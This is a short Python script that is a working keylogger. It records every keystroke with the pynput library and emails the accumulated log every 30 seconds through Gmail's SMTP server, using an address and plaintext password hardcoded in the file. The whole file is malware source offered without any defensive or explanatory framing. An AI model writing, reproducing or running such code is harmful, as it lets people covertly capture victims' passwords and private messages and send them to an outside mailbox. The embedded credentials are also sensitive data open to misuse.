import pynput.keyboard
import smtplib
import threading

log = str()
def callback_function(key):
    global log
    try:
        log = log + key.char
        #log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        if key == key.enter:
            log = log + "\n"
        else:
            log = log + str(key)
    print(log)

def mail_send(email,password,message):
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login(user=email,password=password)
    email_server.sendmail(from_addr=email,to_addrs=email,msg=message)
    email_server.quit()

#thread  -  thereading

def thread_function():
    global log
    mail_send(email="gultekinisa95@gmail.com",password="Imran1453isa!",message=log)
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
